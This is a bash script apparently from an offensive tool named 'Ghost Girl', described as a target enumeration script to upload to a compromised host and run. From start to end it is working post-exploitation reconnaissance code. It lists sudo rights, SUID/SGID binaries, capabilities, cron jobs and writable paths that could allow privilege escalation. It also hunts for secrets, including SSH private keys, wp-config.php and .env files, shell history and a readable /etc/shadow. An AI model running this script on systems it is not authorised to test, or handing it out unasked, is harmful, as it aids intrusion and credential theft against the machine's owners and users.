#!/bin/bash
# Ghost Girl — Target enumeration script
# Pure bash, no dependencies. Upload to target and run.
# Output uses ---SECTION:name--- markers for machine parsing.

echo "---SECTION:identity---"
echo "USER=$(whoami)"
echo "UID=$(id -u)"
echo "GID=$(id -g)"
echo "GROUPS=$(id)"
echo "HOME=$HOME"
echo "SHELL=$SHELL"

echo "---SECTION:system---"
echo "HOSTNAME=$(hostname)"
echo "KERNEL=$(uname -a)"
[ -f /etc/os-release ] && cat /etc/os-release
[ -f /etc/issue ] && echo "ISSUE=$(cat /etc/issue | head -1)"
echo "UPTIME=$(uptime)"

echo "---SECTION:sudo---"
# sudo -l — will prompt for password if needed, timeout after 2s
timeout 3 sudo -l 2>&1 || echo "SUDO_CHECK=failed_or_no_sudo"

echo "---SECTION:suid---"
find / -perm -4000 -type f 2>/dev/null | sort

echo "---SECTION:sgid---"
find / -perm -2000 -type f 2>/dev/null | sort

echo "---SECTION:capabilities---"
getcap -r / 2>/dev/null | sort

echo "---SECTION:cron---"
echo "=== /etc/crontab ==="
cat /etc/crontab 2>/dev/null
echo ""
echo "=== /etc/cron.d/ ==="
ls -la /etc/cron.d/ 2>/dev/null
for f in /etc/cron.d/*; do
    [ -f "$f" ] && echo "--- $f ---" && cat "$f" 2>/dev/null
done
echo ""
echo "=== crontab -l ==="
crontab -l 2>/dev/null || echo "No crontab for $(whoami)"
echo ""
echo "=== /var/spool/cron/ ==="
ls -la /var/spool/cron/crontabs/ 2>/dev/null

echo "---SECTION:network---"
echo "=== Interfaces ==="
ip addr 2>/dev/null || ifconfig 2>/dev/null
echo ""
echo "=== Routes ==="
ip route 2>/dev/null || route -n 2>/dev/null
echo ""
echo "=== Listening ==="
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
echo ""
echo "=== Connections ==="
ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null

echo "---SECTION:writable---"
echo "=== Writable directories ==="
find / -writable -type d 2>/dev/null | grep -v -E "^/proc|^/sys|^/dev" | head -50
echo ""
echo "=== World-writable files ==="
find / -writable -type f 2>/dev/null | grep -v -E "^/proc|^/sys|^/dev" | head -50

echo "---SECTION:interesting_files---"
echo "=== Config files with passwords ==="
grep -rl "password" /etc/ 2>/dev/null | head -20
echo ""
echo "=== SSH keys ==="
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null
echo ""
echo "=== Backup files ==="
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*.save" 2>/dev/null | grep -v -E "^/proc|^/sys" | head -20
echo ""
echo "=== Database files ==="
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | grep -v -E "^/proc|^/sys" | head -20
echo ""
echo "=== WordPress config ==="
find / -name "wp-config.php" 2>/dev/null
echo ""
echo "=== .env files ==="
find / -name ".env" 2>/dev/null | head -10
echo ""
echo "=== History files ==="
ls -la ~/.*history 2>/dev/null
cat ~/.bash_history 2>/dev/null | tail -30

echo "---SECTION:processes---"
ps auxf 2>/dev/null || ps aux 2>/dev/null

echo "---SECTION:users---"
echo "=== /etc/passwd (shells) ==="
grep -v "nologin\|false" /etc/passwd
echo ""
echo "=== /etc/shadow readable? ==="
cat /etc/shadow 2>/dev/null && echo "SHADOW_READABLE=yes" || echo "SHADOW_READABLE=no"
echo ""
echo "=== Logged in users ==="
w 2>/dev/null
echo ""
echo "=== Last logins ==="
last -10 2>/dev/null

echo "---SECTION:end---"
